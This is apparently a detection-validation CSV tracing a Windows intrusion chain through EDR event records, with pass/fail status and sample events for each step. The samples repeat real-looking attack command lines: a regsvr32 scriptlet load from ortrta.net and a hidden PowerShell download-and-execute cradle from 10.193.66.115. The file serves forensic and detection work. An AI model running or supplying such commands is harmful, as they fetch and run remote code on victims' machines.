chain_id,step_id,order,subject,action,object,evidence_basis,search_window_start_utc,search_window_end_utc,terms,status,best_table,best_count,cbc_alert_hits,cbc_event_hits,sysmon_hits,stage3_status,stage3_best_table,stage3_best_count,sample,stage3_sample
s3_attack_04_regsvr32_hidden_powershell,S3-04-S02,2,regsvr32.exe (PID 3992),started,"powershell.exe (PID 2340), -nop -w hidden -c IEX ((New-Object Net.WebClient).DownloadString(...))",Canonical CBC EDR event row,2022-07-19T14:30:00Z,2022-07-19T14:45:00Z,regsvr32.exe; powershell.exe,pass,cbc_events,197,4,197,1,pass,cbc_events,197,"{""id"": 17863, ""timestamp_utc"": ""2022-07-19T14:36:16.3384313Z"", ""backend_timestamp_utc"": ""2022-07-19T14:37:30Z"", ""stream_name"": ""cbc-edr"", ""event_id"": null, ""type"": ""endpoint.event.procstart"", ""action"": ""ACTION_CREATE_PROCESS"", ""device_name"": ""WIN-32-H1"", ""process_path"": ""c:\\windows\\system32\\regsvr32.exe"", ""process_pid"": 3992, ""parent_path"": ""c:\\program files\\common files\\microsoft shared\\equation\\eqnedt32.exe"", ""parent_pid"": 2244, ""process_cmdline"": ""regsvr32 /s /n /u /i:http://ortrta.net:8080/sF5riGj4K26DK.sct scrobj.dll"", ""parent_cmdline"": ""\""C:\\Program Files\\Common Files\\Microsoft Shared\\EQUATION\\EQNEDT32.EXE\"" -Embedding"", ""process_username"": ""WIN-32-H1\\aalsahee"", ""sensor_action"": ""ACTION_ALLOW"", ""event_origin"": ""EDR"", ""object_type"": ""Process"", ""object_name"": ""c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe"", ""remote_ip"": null, ""remote_port"": null, ""local_ip"": null, ""local_port"": null, ""netconn_domain"": null, ""childproc_name"": ""c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe"", ""childproc_pid"": 2340, ""filemod_name"": null, ""regmod_name"": null, ""modload_name"": null, ""crossproc_name"": null, ""crossproc_api"": null, ""raw_json"": null, ""_match_mode"": ""all_terms""}","{""id"": 17863, ""timestamp_utc"": ""2022-07-19T14:36:16.3384313Z"", ""backend_timestamp_utc"": ""2022-07-19T14:37:30Z"", ""stream_name"": ""cbc-edr"", ""event_id"": null, ""type"": ""endpoint.event.procstart"", ""action"": ""ACTION_CREATE_PROCESS"", ""device_name"": ""WIN-32-H1"", ""process_path"": ""c:\\windows\\system32\\regsvr32.exe"", ""process_pid"": 3992, ""parent_path"": ""c:\\program files\\common files\\microsoft shared\\equation\\eqnedt32.exe"", ""parent_pid"": 2244, ""process_cmdline"": ""regsvr32 /s /n /u /i:http://ortrta.net:8080/sF5riGj4K26DK.sct scrobj.dll"", ""parent_cmdline"": ""\""C:\\Program Files\\Common Files\\Microsoft Shared\\EQUATION\\EQNEDT32.EXE\"" -Embedding"", ""process_username"": ""WIN-32-H1\\aalsahee"", ""sensor_action"": ""ACTION_ALLOW"", ""event_origin"": ""EDR"", ""object_type"": ""Process"", ""object_name"": ""c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe"", ""remote_ip"": null, ""remote_port"": null, ""local_ip"": null, ""local_port"": null, ""netconn_domain"": null, ""childproc_name"": ""c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe"", ""childproc_pid"": 2340, ""filemod_name"": null, ""regmod_name"": null, ""modload_name"": null, ""crossproc_name"": null, ""crossproc_api"": null, ""raw_json"": null, ""_match_mode"": ""all_terms""}"
s3_attack_04_regsvr32_hidden_powershell,S3-04-S03,3,powershell.exe (PID 2340),connected,10.193.66.115:8080,Canonical CBC EDR event row,2022-07-19T14:30:00Z,2022-07-19T14:45:00Z,regsvr32.exe; powershell.exe; 10.193.66.115:8080,pass,cbc_events,196,4,196,1,pass,cbc_events,196,"{""id"": 17869, ""timestamp_utc"": ""2022-07-19T14:36:16.4632315Z"", ""backend_timestamp_utc"": ""2022-07-19T14:37:30Z"", ""stream_name"": ""cbc-edr"", ""event_id"": null, ""type"": ""endpoint.event.moduleload"", ""action"": ""ACTION_LOAD_MODULE"", ""device_name"": ""WIN-32-H1"", ""process_path"": ""c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe"", ""process_pid"": 2340, ""parent_path"": ""c:\\windows\\system32\\regsvr32.exe"", ""parent_pid"": 3992, ""process_cmdline"": ""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" -nop -w hidden -c IEX ((new-object Net.WebClient).DownloadString('http://10.193.66.115:8080/sF5riGj4K26DK'));"", ""parent_cmdline"": ""regsvr32 /s /n /u /i:http://ortrta.net:8080/sF5riGj4K26DK.sct scrobj.dll"", ""process_username"": ""WIN-32-H1\\aalsahee"", ""sensor_action"": ""ACTION_ALLOW"", ""event_origin"": ""EDR"", ""object_type"": ""Image"", ""object_name"": ""c:\\windows\\system32\\atl.dll"", ""remote_ip"": null, ""remote_port"": null, ""local_ip"": null, ""local_port"": null, ""netconn_domain"": null, ""childproc_name"": null, ""childproc_pid"": null, ""filemod_name"": null, ""regmod_name"": null, ""modload_name"": ""c:\\windows\\system32\\atl.dll"", ""crossproc_name"": null, ""crossproc_api"": null, ""raw_json"": null, ""_match_mode"": ""all_terms""}","{""id"": 17869, ""timestamp_utc"": ""2022-07-19T14:36:16.4632315Z"", ""backend_timestamp_utc"": ""2022-07-19T14:37:30Z"", ""stream_name"": ""cbc-edr"", ""event_id"": null, ""type"": ""endpoint.event.moduleload"", ""action"": ""ACTION_LOAD_MODULE"", ""device_name"": ""WIN-32-H1"", ""process_path"": ""c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe"", ""process_pid"": 2340, ""parent_path"": ""c:\\windows\\system32\\regsvr32.exe"", ""parent_pid"": 3992, ""process_cmdline"": ""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" -nop -w hidden -c IEX ((new-object Net.WebClient).DownloadString('http://10.193.66.115:8080/sF5riGj4K26DK'));"", ""parent_cmdline"": ""regsvr32 /s /n /u /i:http://ortrta.net:8080/sF5riGj4K26DK.sct scrobj.dll"", ""process_username"": ""WIN-32-H1\\aalsahee"", ""sensor_action"": ""ACTION_ALLOW"", ""event_origin"": ""EDR"", ""object_type"": ""Image"", ""object_name"": ""c:\\windows\\system32\\atl.dll"", ""remote_ip"": null, ""remote_port"": null, ""local_ip"": null, ""local_port"": null, ""netconn_domain"": null, ""childproc_name"": null, ""childproc_pid"": null, ""filemod_name"": null, ""regmod_name"": null, ""modload_name"": ""c:\\windows\\system32\\atl.dll"", ""crossproc_name"": null, ""crossproc_api"": null, ""raw_json"": null, ""_match_mode"": ""all_terms""}"
s3_attack_04_regsvr32_hidden_powershell,S3-04-S04,4,powershell.exe (PID 2340),connected,10.193.66.115:8443,Canonical CBC EDR event row,2022-07-19T14:30:00Z,2022-07-19T14:45:00Z,regsvr32.exe; powershell.exe; 10.193.66.115:8443,fail,,0,0,0,0,unsupported_after_alert_summary_removal,,0,,
s3_attack_05_powershell_cmd_payload,S3-05-S01,1,powershell.exe (PID 2340),started,cmd.exe (PID 1880),Canonical CBC EDR event row,2022-07-19T14:30:00Z,2022-07-19T14:45:00Z,powershell.exe; cmd.exe,pass,cbc_events,13,0,13,1,pass,cbc_events,13,"{""id"": 18350, ""timestamp_utc"": ""2022-07-19T14:37:17.3969385Z"", ""backend_timestamp_utc"": ""2022-07-19T14:37:30Z"", ""stream_name"": ""cbc-edr"", ""event_id"": null, ""type"": ""endpoint.event.procstart"", ""action"": ""ACTION_CREATE_PROCESS"", ""device_name"": ""WIN-32-H1"", ""process_path"": ""c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe"", ""process_pid"": 2340, ""parent_path"": ""c:\\windows\\system32\\regsvr32.exe"", ""parent_pid"": 3992, ""process_cmdline"": ""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" -nop -w hidden -c IEX ((new-object Net.WebClient).DownloadString('http://10.193.66.115:8080/sF5riGj4K26DK'));"", ""parent_cmdline"": ""regsvr32 /s /n /u /i:http://ortrta.net:8080/sF5riGj4K26DK.sct scrobj.dll"", ""process_username"": ""WIN-32-H1\\aalsahee"", ""sensor_action"": ""ACTION_ALLOW"", ""event_origin"": ""EDR"", ""object_type"": ""Process"", ""object_name"": ""c:\\windows\\system32\\cmd.exe"", ""remote_ip"": null, ""remote_port"": null, ""local_ip"": null, ""local_port"": null, ""netconn_domain"": null, ""childproc_name"": ""c:\\windows\\system32\\cmd.exe"", ""childproc_pid"": 1880, ""filemod_name"": null, ""regmod_name"": null, ""modload_name"": null, ""crossproc_name"": null, ""crossproc_api"": null, ""raw_json"": null, ""_match_mode"": ""all_terms""}","{""id"": 18350, ""timestamp_utc"": ""2022-07-19T14:37:17.3969385Z"", ""backend_timestamp_utc"": ""2022-07-19T14:37:30Z"", ""stream_name"": ""cbc-edr"", ""event_id"": null, ""type"": ""endpoint.event.procstart"", ""action"": ""ACTION_CREATE_PROCESS"", ""device_name"": ""WIN-32-H1"", ""process_path"": ""c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe"", ""process_pid"": 2340, ""parent_path"": ""c:\\windows\\system32\\regsvr32.exe"", ""parent_pid"": 3992, ""process_cmdline"": ""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" -nop -w hidden -c IEX ((new-object Net.WebClient).DownloadString('http://10.193.66.115:8080/sF5riGj4K26DK'));"", ""parent_cmdline"": ""regsvr32 /s /n /u /i:http://ortrta.net:8080/sF5riGj4K26DK.sct scrobj.dll"", ""process_username"": ""WIN-32-H1\\aalsahee"", ""sensor_action"": ""ACTION_ALLOW"", ""event_origin"": ""EDR"", ""object_type"": ""Process"", ""object_name"": ""c:\\windows\\system32\\cmd.exe"", ""remote_ip"": null, ""remote_port"": null, ""local_ip"": null, ""local_port"": null, ""netconn_domain"": null, ""childproc_name"": ""c:\\windows\\system32\\cmd.exe"", ""childproc_pid"": 1880, ""filemod_name"": null, ""regmod_name"": null, ""modload_name"": null, ""crossproc_name"": null, ""crossproc_api"": null, ""raw_json"": null, ""_match_mode"": ""all_terms""}"
s3_attack_05_powershell_cmd_payload,S3-05-S02,2,cmd.exe (PID 1880),started,C:\Users\aalsahee\payload.exe (PID 3208),Canonical CBC EDR event row,2022-07-19T14:30:00Z,2022-07-19T14:45:00Z,powershell.exe; cmd.exe; payload.exe,pass,cbc_events,3,0,3,0,pass,cbc_events,3,"{""id"": 18358, ""timestamp_utc"": ""2022-07-19T14:37:20.2361435Z"", ""backend_timestamp_utc"": ""2022-07-19T14:37:30Z"", ""stream_name"": ""cbc-edr"", ""event_id"": null, ""type"": ""endpoint.event.procstart"", ""action"": ""ACTION_CREATE_PROCESS"", ""device_name"": ""WIN-32-H1"", ""process_path"": ""c:\\windows\\system32\\cmd.exe"", ""process_pid"": 1880, ""parent_path"": ""c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe"", ""parent_pid"": 2340, ""process_cmdline"": ""C:\\Windows\\system32\\cmd.exe"", ""parent_cmdline"": ""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" -nop -w hidden -c IEX ((new-object Net.WebClient).DownloadString('http://10.193.66.115:8080/sF5riGj4K26DK'));"", ""process_username"": ""WIN-32-H1\\aalsahee"", ""sensor_action"": ""ACTION_ALLOW"", ""event_origin"": ""EDR"", ""object_type"": ""Process"", ""object_name"": ""c:\\users\\aalsahee\\payload.exe"", ""remote_ip"": null, ""remote_port"": null, ""local_ip"": null, ""local_port"": null, ""netconn_domain"": null, ""childproc_name"": ""c:\\users\\aalsahee\\payload.exe"", ""childproc_pid"": 3208, ""filemod_name"": null, ""regmod_name"": null, ""modload_name"": null, ""crossproc_name"": null, ""crossproc_api"": null, ""raw_json"": null, ""_match_mode"": ""all_terms""}","{""id"": 18358, ""timestamp_utc"": ""2022-07-19T14:37:20.2361435Z"", ""backend_timestamp_utc"": ""2022-07-19T14:37:30Z"", ""stream_name"": ""cbc-edr"", ""event_id"": null, ""type"": ""endpoint.event.procstart"", ""action"": ""ACTION_CREATE_PROCESS"", ""device_name"": ""WIN-32-H1"", ""process_path"": ""c:\\windows\\system32\\cmd.exe"", ""process_pid"": 1880, ""parent_path"": ""c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe"", ""parent_pid"": 2340, ""process_cmdline"": ""C:\\Windows\\system32\\cmd.exe"", ""parent_cmdline"": ""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" -nop -w hidden -c IEX ((new-object Net.WebClient).DownloadString('http://10.193.66.115:8080/sF5riGj4K26DK'));"", ""process_username"": ""WIN-32-H1\\aalsahee"", ""sensor_action"": ""ACTION_ALLOW"", ""event_origin"": ""EDR"", ""object_type"": ""Process"", ""object_name"": ""c:\\users\\aalsahee\\payload.exe"", ""remote_ip"": null, ""remote_port"": null, ""local_ip"": null, ""local_port"": null, ""netconn_domain"": null, ""childproc_name"": ""c:\\users\\aalsahee\\payload.exe"", ""childproc_pid"": 3208, ""filemod_name"": null, ""regmod_name"": null, ""modload_name"": null, ""crossproc_name"": null, ""crossproc_api"": null, ""raw_json"": null, ""_match_mode"": ""all_terms""}"
s3_attack_05_powershell_cmd_payload,S3-05-S03,3,payload.exe (PID 3208),started,payload.exe (PID 4964),Canonical CBC EDR event row,2022-07-19T14:30:00Z,2022-07-19T14:45:00Z,powershell.exe; payload.exe,pass,cbc_events,6,0,6,0,pass,cbc_events,6,"{""id"": 18346, ""timestamp_utc"": ""2022-07-19T14:37:11.1725276Z"", ""backend_timestamp_utc"": ""2022-07-19T14:37:30Z"", ""stream_name"": ""cbc-edr"", ""event_id"": null, ""type"": ""endpoint.event.filemod"", ""action"": ""ACTION_FILE_CREATE | ACTION_FILE_DELETE | ACTION_FILE_MOD_OPEN | ACTION_FILE_TRUNCATE | ACTION_FILE_OPEN_WRITE | ACTION_FILE_OPEN_SET_ATTRIBUTES"", ""device_name"": ""WIN-32-H1"", ""process_path"": ""c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe"", ""process_pid"": 2340, ""parent_path"": ""c:\\windows\\system32\\regsvr32.exe"", ""parent_pid"": 3992, ""process_cmdline"": ""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" -nop -w hidden -c IEX ((new-object Net.WebClient).DownloadString('http://10.193.66.115:8080/sF5riGj4K26DK'));"", ""parent_cmdline"": ""regsvr32 /s /n /u /i:http://ortrta.net:8080/sF5riGj4K26DK.sct scrobj.dll"", ""process_username"": ""WIN-32-H1\\aalsahee"", ""sensor_action"": ""ACTION_ALLOW"", ""event_origin"": ""EDR"", ""object_type"": ""File"", ""object_name"": ""c:\\users\\aalsahee\\payload.exe"", ""remote_ip"": null, ""remote_port"": null, ""local_ip"": null, ""local_port"": null, ""netconn_domain"": null, ""childproc_name"": null, ""childproc_pid"": null, ""filemod_name"": ""c:\\users\\aalsahee\\payload.exe"", ""regmod_name"": null, ""modload_name"": null, ""crossproc_name"": null, ""crossproc_api"": null, ""raw_json"": null, ""_match_mode"": ""all_terms""}","{""id"": 18346, ""timestamp_utc"": ""2022-07-19T14:37:11.1725276Z"", ""backend_timestamp_utc"": ""2022-07-19T14:37:30Z"", ""stream_name"": ""cbc-edr"", ""event_id"": null, ""type"": ""endpoint.event.filemod"", ""action"": ""ACTION_FILE_CREATE | ACTION_FILE_DELETE | ACTION_FILE_MOD_OPEN | ACTION_FILE_TRUNCATE | ACTION_FILE_OPEN_WRITE | ACTION_FILE_OPEN_SET_ATTRIBUTES"", ""device_name"": ""WIN-32-H1"", ""process_path"": ""c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe"", ""process_pid"": 2340, ""parent_path"": ""c:\\windows\\system32\\regsvr32.exe"", ""parent_pid"": 3992, ""process_cmdline"": ""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" -nop -w hidden -c IEX ((new-object Net.WebClient).DownloadString('http://10.193.66.115:8080/sF5riGj4K26DK'));"", ""parent_cmdline"": ""regsvr32 /s /n /u /i:http://ortrta.net:8080/sF5riGj4K26DK.sct scrobj.dll"", ""process_username"": ""WIN-32-H1\\aalsahee"", ""sensor_action"": ""ACTION_ALLOW"", ""event_origin"": ""EDR"", ""object_type"": ""File"", ""object_name"": ""c:\\users\\aalsahee\\payload.exe"", ""remote_ip"": null, ""remote_port"": null, ""local_ip"": null, ""local_port"": null, ""netconn_domain"": null, ""childproc_name"": null, ""childproc_pid"": null, ""filemod_name"": ""c:\\users\\aalsahee\\payload.exe"", ""regmod_name"": null, ""modload_name"": null, ""crossproc_name"": null, ""crossproc_api"": null, ""raw_json"": null, ""_match_mode"": ""all_terms""}"
s3_attack_06_payload_connection_cleanup,S3-06-S01,1,payload.exe (PID 4964),connected,ortrta.net / 10.193.66.115:9999,Canonical CBC EDR event row,2022-07-19T14:30:00Z,2022-07-19T14:45:00Z,payload.exe; 10.193.66.115:9999,fail,,0,0,0,0,unsupported_after_alert_summary_removal,,0,,
s3_attack_06_payload_connection_cleanup,S3-06-S02,2,payload.exe (PID 4964),terminated,payload.exe (PID 4964),Canonical CBC EDR event row,2022-07-19T14:30:00Z,2022-07-19T14:45:00Z,payload.exe,pass,cbc_events,302,0,302,4,pass,cbc_events,302,"{""id"": 18346, ""timestamp_utc"": ""2022-07-19T14:37:11.1725276Z"", ""backend_timestamp_utc"": ""2022-07-19T14:37:30Z"", ""stream_name"": ""cbc-edr"", ""event_id"": null, ""type"": ""endpoint.event.filemod"", ""action"": ""ACTION_FILE_CREATE | ACTION_FILE_DELETE | ACTION_FILE_MOD_OPEN | ACTION_FILE_TRUNCATE | ACTION_FILE_OPEN_WRITE | ACTION_FILE_OPEN_SET_ATTRIBUTES"", ""device_name"": ""WIN-32-H1"", ""process_path"": ""c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe"", ""process_pid"": 2340, ""parent_path"": ""c:\\windows\\system32\\regsvr32.exe"", ""parent_pid"": 3992, ""process_cmdline"": ""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" -nop -w hidden -c IEX ((new-object Net.WebClient).DownloadString('http://10.193.66.115:8080/sF5riGj4K26DK'));"", ""parent_cmdline"": ""regsvr32 /s /n /u /i:http://ortrta.net:8080/sF5riGj4K26DK.sct scrobj.dll"", ""process_username"": ""WIN-32-H1\\aalsahee"", ""sensor_action"": ""ACTION_ALLOW"", ""event_origin"": ""EDR"", ""object_type"": ""File"", ""object_name"": ""c:\\users\\aalsahee\\payload.exe"", ""remote_ip"": null, ""remote_port"": null, ""local_ip"": null, ""local_port"": null, ""netconn_domain"": null, ""childproc_name"": null, ""childproc_pid"": null, ""filemod_name"": ""c:\\users\\aalsahee\\payload.exe"", ""regmod_name"": null, ""modload_name"": null, ""crossproc_name"": null, ""crossproc_api"": null, ""raw_json"": null, ""_match_mode"": ""all_terms""}","{""id"": 18346, ""timestamp_utc"": ""2022-07-19T14:37:11.1725276Z"", ""backend_timestamp_utc"": ""2022-07-19T14:37:30Z"", ""stream_name"": ""cbc-edr"", ""event_id"": null, ""type"": ""endpoint.event.filemod"", ""action"": ""ACTION_FILE_CREATE | ACTION_FILE_DELETE | ACTION_FILE_MOD_OPEN | ACTION_FILE_TRUNCATE | ACTION_FILE_OPEN_WRITE | ACTION_FILE_OPEN_SET_ATTRIBUTES"", ""device_name"": ""WIN-32-H1"", ""process_path"": ""c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe"", ""process_pid"": 2340, ""parent_path"": ""c:\\windows\\system32\\regsvr32.exe"", ""parent_pid"": 3992, ""process_cmdline"": ""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" -nop -w hidden -c IEX ((new-object Net.WebClient).DownloadString('http://10.193.66.115:8080/sF5riGj4K26DK'));"", ""parent_cmdline"": ""regsvr32 /s /n /u /i:http://ortrta.net:8080/sF5riGj4K26DK.sct scrobj.dll"", ""process_username"": ""WIN-32-H1\\aalsahee"", ""sensor_action"": ""ACTION_ALLOW"", ""event_origin"": ""EDR"", ""object_type"": ""File"", ""object_name"": ""c:\\users\\aalsahee\\payload.exe"", ""remote_ip"": null, ""remote_port"": null, ""local_ip"": null, ""local_port"": null, ""netconn_domain"": null, ""childproc_name"": null, ""childproc_pid"": null, ""filemod_name"": ""c:\\users\\aalsahee\\payload.exe"", ""regmod_name"": null, ""modload_name"": null, ""crossproc_name"": null, ""crossproc_api"": null, ""raw_json"": null, ""_match_mode"": ""all_terms""}"
s3_attack_06_payload_connection_cleanup,S3-06-S03,3,payload.exe (PID 3208),deleted,C:\Users\aalsahee\AppData\Local\Temp\_MEI32082,Canonical CBC EDR event row,2022-07-19T14:30:00Z,2022-07-19T14:45:00Z,payload.exe,pass,cbc_events,302,0,302,4,pass,cbc_events,302,"{""id"": 18346, ""timestamp_utc"": ""2022-07-19T14:37:11.1725276Z"", ""backend_timestamp_utc"": ""2022-07-19T14:37:30Z"", ""stream_name"": ""cbc-edr"", ""event_id"": null, ""type"": ""endpoint.event.filemod"", ""action"": ""ACTION_FILE_CREATE | ACTION_FILE_DELETE | ACTION_FILE_MOD_OPEN | ACTION_FILE_TRUNCATE | ACTION_FILE_OPEN_WRITE | ACTION_FILE_OPEN_SET_ATTRIBUTES"", ""device_name"": ""WIN-32-H1"", ""process_path"": ""c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe"", ""process_pid"": 2340, ""parent_path"": ""c:\\windows\\system32\\regsvr32.exe"", ""parent_pid"": 3992, ""process_cmdline"": ""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" -nop -w hidden -c IEX ((new-object Net.WebClient).DownloadString('http://10.193.66.115:8080/sF5riGj4K26DK'));"", ""parent_cmdline"": ""regsvr32 /s /n /u /i:http://ortrta.net:8080/sF5riGj4K26DK.sct scrobj.dll"", ""process_username"": ""WIN-32-H1\\aalsahee"", ""sensor_action"": ""ACTION_ALLOW"", ""event_origin"": ""EDR"", ""object_type"": ""File"", ""object_name"": ""c:\\users\\aalsahee\\payload.exe"", ""remote_ip"": null, ""remote_port"": null, ""local_ip"": null, ""local_port"": null, ""netconn_domain"": null, ""childproc_name"": null, ""childproc_pid"": null, ""filemod_name"": ""c:\\users\\aalsahee\\payload.exe"", ""regmod_name"": null, ""modload_name"": null, ""crossproc_name"": null, ""crossproc_api"": null, ""raw_json"": null, ""_match_mode"": ""all_terms""}","{""id"": 18346, ""timestamp_utc"": ""2022-07-19T14:37:11.1725276Z"", ""backend_timestamp_utc"": ""2022-07-19T14:37:30Z"", ""stream_name"": ""cbc-edr"", ""event_id"": null, ""type"": ""endpoint.event.filemod"", ""action"": ""ACTION_FILE_CREATE | ACTION_FILE_DELETE | ACTION_FILE_MOD_OPEN | ACTION_FILE_TRUNCATE | ACTION_FILE_OPEN_WRITE | ACTION_FILE_OPEN_SET_ATTRIBUTES"", ""device_name"": ""WIN-32-H1"", ""process_path"": ""c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe"", ""process_pid"": 2340, ""parent_path"": ""c:\\windows\\system32\\regsvr32.exe"", ""parent_pid"": 3992, ""process_cmdline"": ""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" -nop -w hidden -c IEX ((new-object Net.WebClient).DownloadString('http://10.193.66.115:8080/sF5riGj4K26DK'));"", ""parent_cmdline"": ""regsvr32 /s /n /u /i:http://ortrta.net:8080/sF5riGj4K26DK.sct scrobj.dll"", ""process_username"": ""WIN-32-H1\\aalsahee"", ""sensor_action"": ""ACTION_ALLOW"", ""event_origin"": ""EDR"", ""object_type"": ""File"", ""object_name"": ""c:\\users\\aalsahee\\payload.exe"", ""remote_ip"": null, ""remote_port"": null, ""local_ip"": null, ""local_port"": null, ""netconn_domain"": null, ""childproc_name"": null, ""childproc_pid"": null, ""filemod_name"": ""c:\\users\\aalsahee\\payload.exe"", ""regmod_name"": null, ""modload_name"": null, ""crossproc_name"": null, ""crossproc_api"": null, ""raw_json"": null, ""_match_mode"": ""all_terms""}"
s3_attack_06_payload_connection_cleanup,S3-06-S04,4,payload.exe (PID 3208),terminated,C:\Users\aalsahee\payload.exe,Canonical CBC EDR event row,2022-07-19T14:30:00Z,2022-07-19T14:45:00Z,payload.exe,pass,cbc_events,302,0,302,4,pass,cbc_events,302,"{""id"": 18346, ""timestamp_utc"": ""2022-07-19T14:37:11.1725276Z"", ""backend_timestamp_utc"": ""2022-07-19T14:37:30Z"", ""stream_name"": ""cbc-edr"", ""event_id"": null, ""type"": ""endpoint.event.filemod"", ""action"": ""ACTION_FILE_CREATE | ACTION_FILE_DELETE | ACTION_FILE_MOD_OPEN | ACTION_FILE_TRUNCATE | ACTION_FILE_OPEN_WRITE | ACTION_FILE_OPEN_SET_ATTRIBUTES"", ""device_name"": ""WIN-32-H1"", ""process_path"": ""c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe"", ""process_pid"": 2340, ""parent_path"": ""c:\\windows\\system32\\regsvr32.exe"", ""parent_pid"": 3992, ""process_cmdline"": ""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" -nop -w hidden -c IEX ((new-object Net.WebClient).DownloadString('http://10.193.66.115:8080/sF5riGj4K26DK'));"", ""parent_cmdline"": ""regsvr32 /s /n /u /i:http://ortrta.net:8080/sF5riGj4K26DK.sct scrobj.dll"", ""process_username"": ""WIN-32-H1\\aalsahee"", ""sensor_action"": ""ACTION_ALLOW"", ""event_origin"": ""EDR"", ""object_type"": ""File"", ""object_name"": ""c:\\users\\aalsahee\\payload.exe"", ""remote_ip"": null, ""remote_port"": null, ""local_ip"": null, ""local_port"": null, ""netconn_domain"": null, ""childproc_name"": null, ""childproc_pid"": null, ""filemod_name"": ""c:\\users\\aalsahee\\payload.exe"", ""regmod_name"": null, ""modload_name"": null, ""crossproc_name"": null, ""crossproc_api"": null, ""raw_json"": null, ""_match_mode"": ""all_terms""}","{""id"": 18346, ""timestamp_utc"": ""2022-07-19T14:37:11.1725276Z"", ""backend_timestamp_utc"": ""2022-07-19T14:37:30Z"", ""stream_name"": ""cbc-edr"", ""event_id"": null, ""type"": ""endpoint.event.filemod"", ""action"": ""ACTION_FILE_CREATE | ACTION_FILE_DELETE | ACTION_FILE_MOD_OPEN | ACTION_FILE_TRUNCATE | ACTION_FILE_OPEN_WRITE | ACTION_FILE_OPEN_SET_ATTRIBUTES"", ""device_name"": ""WIN-32-H1"", ""process_path"": ""c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe"", ""process_pid"": 2340, ""parent_path"": ""c:\\windows\\system32\\regsvr32.exe"", ""parent_pid"": 3992, ""process_cmdline"": ""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" -nop -w hidden -c IEX ((new-object Net.WebClient).DownloadString('http://10.193.66.115:8080/sF5riGj4K26DK'));"", ""parent_cmdline"": ""regsvr32 /s /n /u /i:http://ortrta.net:8080/sF5riGj4K26DK.sct scrobj.dll"", ""process_username"": ""WIN-32-H1\\aalsahee"", ""sensor_action"": ""ACTION_ALLOW"", ""event_origin"": ""EDR"", ""object_type"": ""File"", ""object_name"": ""c:\\users\\aalsahee\\payload.exe"", ""remote_ip"": null, ""remote_port"": null, ""local_ip"": null, ""local_port"": null, ""netconn_domain"": null, ""childproc_name"": null, ""childproc_pid"": null, ""filemod_name"": ""c:\\users\\aalsahee\\payload.exe"", ""regmod_name"": null, ""modload_name"": null, ""crossproc_name"": null, ""crossproc_api"": null, ""raw_json"": null, ""_match_mode"": ""all_terms""}"
